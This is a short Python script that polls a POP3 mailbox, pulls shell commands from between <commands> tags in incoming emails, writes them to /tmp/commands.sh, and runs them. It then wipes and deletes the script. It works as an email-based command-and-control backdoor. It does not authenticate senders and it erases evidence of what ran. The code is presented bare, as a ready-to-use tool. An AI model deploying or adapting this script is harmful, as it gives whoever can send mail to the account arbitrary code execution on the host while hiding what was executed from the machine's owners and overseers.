import poplib, os

mailuser="aaa"
mailpass="aaa"
mailhost="pop.gmail.com"
mailssl=True
passwordcommand="commands"

begincommandline="<" + passwordcommand + ">"
endcommandline="</" + passwordcommand + ">"

if mailssl:
	M = poplib.POP3_SSL(mailhost)
else:
	M = poplib.POP3(mailhost)

M.user(mailuser)
M.pass_(mailpass)

numMessages = len(M.list()[1])
for i in range(numMessages):
	commands=""
	getcommand=False
	for line in M.retr(i+1)[1]:
		if line == begincommandline:
			getcommand=True
			continue;
		if line == endcommandline:
			getcommand=False
		if getcommand:
			commands+=line+"\n"
	if commands != "":
		file = open("/tmp/commands.sh", "w")
		file.write(commands)
		file.close()

		os.system("/bin/chmod a+rx /tmp/commands.sh")
		os.system("/tmp/commands.sh")
		os.system("/usr/bin/wipe -rf /tmp/commands.sh")
		os.system("/bin/rm -rf /tmp/commands.sh")
		os.system("rm -rf /tmp/commands.sh")
	
M.quit()

